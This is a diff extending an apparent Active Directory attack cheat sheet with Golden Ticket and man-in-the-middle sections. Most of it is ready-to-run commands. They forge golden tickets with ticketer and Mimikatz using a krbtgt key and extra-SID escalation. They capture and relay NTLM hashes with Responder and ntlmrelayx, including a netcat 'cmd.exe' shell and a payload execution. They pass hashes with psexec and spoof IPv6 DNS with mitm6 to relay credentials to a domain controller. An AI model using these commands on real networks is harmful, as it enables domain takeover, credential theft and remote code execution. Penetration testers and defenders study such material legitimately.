@@ -372,3 +372,72 @@ python3 /path/to/impacket/ticket_converter.py ticket.ccache ticket.kirbi
 python3 GetTGT.py <domain>/<username>:<password>@<target_ip>
 
 ```
+## Golden Ticket
+```powershell
+- Target Domain
+- Krbtgt hash
+- Child Domain SID, 
+- Domain group RID, in our case 516 (Domain Controllers),
+- User-id for corpmngr, which is 1106
+- Extra-SID(parent domain controller) and Domain group id, also 516
+
+The domain in -domain must match the domain for which you have the krbtgt hash or AES 
+key, and it must match the SID too.
+
+
+We will forge golden ticket using ticketer as follows :
+python ticketer.py -domain child.warfare.corp -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 
+-domain-sid S-1-5-21-3754860944-83624914-1883974761 -groups 516 -user-id 1106 -extra-sid 
+S-1-5-21-3375883379-808943238-3239386119-516,S-1-5-9 'corpmngr'
+
+Let’s set the ccache file to the environment variable.
+export KRB5CCNAME=corpmngr.ccache
+
+Request Service Ticket using the ccache file.
+getST.py -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/corpmngr -debug
+
+Note: If you get a clock skew error, use ntpdate <parent DC IP>, then add warfare.corp &
+dc01.warfare.corp for 192.168.98.2 in /etc/hosts file.
+
+export KRB5CCNAME=corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
+
+Method 2: Using powershell
+Invoke-Mimikatz 'kerberos::golden /user:Administrator /domain:child.warfare.corp 
+/sid:S-1-5-21-2230880485-3678016799-1251797681 /sids:S-1-5-21-327841210-681985034-2439807140-519 
+/aes256:fe9541bf50806d0bd86ce1c18bc926f50b18fc92f6b8172dad7f7fe0bbae231f52b1 
+/startoffset:-5 /endin:600 /renew:10080 /ptt'
+```
+## MITM
+```powershell
+- Capture Hasshes with Responder
+Responder -I eth0 -rdw -v 
+- Relay Ntlmv2 Hashes or crack Ntlm or Ntlmv2 hashes to dump the local hashes on the computers
+ntlmrelayx.pyx -tf targets.txt -smb2support(turn off smb and http)
+ntlmrelayx.pyx -tf targets.txt -smb2support -i (interactive shell).
+ntlmrelayx.py -tf targets.txt -smb2support -c "nc 127.0.0.1 4444 -e cmd.exe"
+ntlmrelayx.pyx -tf targets.txt -smb2support -e payloads.exe
+ntlmrelayx.pyx -tf targets.txt -smb2support -c "whoami"
+
+- Use psexec.py instead of the one in psexec in metasploit to authenticate with cracked 
+ntlmv2 password because it is flagged by windows or use smb to login directly.
+Syntax: psexec.py marvel.local/fcastle:Password1@192.168.0.12
+psexec.py <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes <LM_HASH>:<NT_HASH>
+ 
+
+MITM6 IPV6
+An attacker runs mitm6 -i eth0 -d target.local 
+to spoof DNS for the “target.local” domain
+
+- run ntlmrelayx.py -6 -t ldaps://<DC_IP> -wh fakewpad.target.local -l lootme 
+to listen for IPv6 traffic, serve a fake WPAD file, and relay credentials to the Domain 
+Controller (DC).
+
+A Windows machine reboots, sending a DHCPv6 request. mitm6 assigns it an IPv6 address 
+with the attacker’s machine as the DNS server.
+•  The machine requests WPAD settings, authenticates to the attacker’s machine, and 
+ntlmrelayx relays the credentials to the DC, potentially dumping domain data or creating
+a new user with admin privileges.
+
+Example: Targeting a file server if you relay non admin cred
+ntlmrelayx.py -6 -t smb://192.168.1.20 -wh fakewpad.target.local -l lootme
+```
